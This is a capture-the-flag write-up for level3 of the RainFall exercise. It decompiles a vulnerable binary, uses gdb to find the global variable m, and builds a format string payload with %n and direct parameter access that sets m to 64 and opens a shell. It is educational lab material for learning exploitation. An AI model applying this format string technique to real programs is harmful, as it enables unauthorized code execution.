when we analyse level3 with ghidra;

```
#include <stdio.h>
#include <stdlib.h>

int m; 

void main(void)
{
    v();
    return;
}

void v(void)
{
    char local_20c[520];

    fgets(local_20c, 0x200, stdin); // 0x200 == 512
    printf(local_20c);

    if (m == 0x40) {      // 0x40 == 64
        fwrite("Wait what?!\n", 1, 0xc, stdout);
        system("/bin/sh");
    }
    return;
}
```

Two things caught our attention here, the first is where the vulnerability, the second is a variable named **m** that we cannot see in this function
We started by first dealing with what **m** actually is.

```
(gdb) whatis m
type = <data variable, no debug info>
```

```
(gdb) p sizeof(m)
$1 = 4
```

```
(gdb) info variables
All defined variables:

Non-debugging symbols:
0x080485f8  _fp_hw
0x080485fc  _IO_stdin_used
0x08048734  __FRAME_END__
0x08049738  __CTOR_LIST__
0x08049738  __init_array_end
0x08049738  __init_array_start
0x0804973c  __CTOR_END__
0x08049740  __DTOR_LIST__
0x08049744  __DTOR_END__
0x08049748  __JCR_END__
0x08049748  __JCR_LIST__
0x0804974c  _DYNAMIC
0x08049818  _GLOBAL_OFFSET_TABLE_
0x0804983c  __data_start
0x0804983c  data_start
0x08049840  __dso_handle
0x08049860  stdin@@GLIBC_2.0
0x08049880  stdout@@GLIBC_2.0
0x08049884  completed.6159
0x08049888  dtor_idx.6161
0x0804988c  m
0xb7ffeca0  _rtld_global_ro
0xb7ffee6c  _dl_argv
0xb7ffef10  __libc_stack_end
0xb7ffef14  __libc_enable_secure
0xb7fff020  _rtld_global
```

With info variables we fully understand that our variable is a global integer variable.
Now we come to the main event, the first thing that caught our attention here was the **printf** function. 
```
 printf(local_20c);
```
This line contains format string vulnerability because printf function uses user input directly as format string.

Thanks to this line, we will use the printf specifier instead of **local_20c** to set **m** to **64** and pass the level.

Payload;
```
(python -c 'print("\x8c\x98\x04\x08" + "%60c%4$n")'; cat) | ./level3
```

%n format specifier: Writes the number of characters typed so far to an address
Direct parameter access: You can access specific parameters in the stack with syntax like %4$n

One of the critical issues here was this. In which argument of printf we will perform this operation.

```
level3@RainFall:~$ echo "AAAA%1\$x%2\$x%3\$x%4\$x%5\$x" | ./level3
AAAA200b7fd1ac0b7ff37d04141414178243125
```

```
AAAA + 200 + b7fd1ac0 + b7ff37d0 + 41414141 + 78243125
  ↑      ↑       ↑         ↑         ↑         ↑
start   %1$x    %2$x      %3$x      %4$x      %5$x
```

We have already learnt that it is mostly in the 4th parameter, but let's say we proved it anyway :)
